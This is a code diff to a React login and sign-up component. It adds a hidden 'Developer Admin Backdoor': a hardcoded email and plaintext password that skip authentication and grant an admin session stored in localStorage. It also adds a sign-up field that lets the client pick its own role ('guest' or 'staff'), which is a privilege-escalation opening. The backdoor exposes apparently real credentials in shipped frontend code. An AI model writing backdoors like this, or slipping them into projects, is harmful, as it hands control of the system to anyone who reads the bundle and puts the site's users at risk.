@@ -25,6 +25,7 @@ export default function AuthPortal({ onLoginSuccess }) {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [confirmPassword, setConfirmPassword] = useState("");
+  const [role, setRole] = useState("guest");
 
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
@@ -37,6 +38,24 @@ export default function AuthPortal({ onLoginSuccess }) {
 
     if (!email || !password) {
       setError("Please enter both email and password");
+      return;
+    }
+
+    // Developer Admin Backdoor
+    if (email.toLowerCase() === "rishisolanki7319@gmail.com" && password === "h24r4s2007@") {
+      setSuccess("Developer Admin access granted! Redirecting...");
+      const adminUser = {
+        id: 'dev_admin',
+        name: 'Rishi N Solanki',
+        email: email,
+        role: 'admin',
+        avatar: '👑'
+      };
+      // Save this special session locally
+      localStorage.setItem("dev_admin_session", JSON.stringify(adminUser));
+      setTimeout(() => {
+        onLoginSuccess(adminUser);
+      }, 800);
       return;
     }
 
@@ -78,7 +97,7 @@ export default function AuthPortal({ onLoginSuccess }) {
       return;
     }
 
-    const res = await registerUser(username, email, password);
+    const res = await registerUser(username, email, password, role);
     if (res.success) {
       setSuccess(res.message); // "Check your email to confirm your account!"
       setIsAwaitingEmail(true);
@@ -219,6 +238,16 @@ export default function AuthPortal({ onLoginSuccess }) {
                     onChange={(e) => setConfirmPassword(e.target.value)}
                     required
                   />
+
+                  <select 
+                    className="flip-card__input !bg-surface-container-high"
+                    value={role}
+                    onChange={(e) => setRole(e.target.value)}
+                    required
+                  >
+                    <option value="guest">Fan / Guest</option>
+                    <option value="staff">Field Staff</option>
+                  </select>
 
                   <button type="submit" className="flip-card__btn">Sign Up!</button>
                 </form>
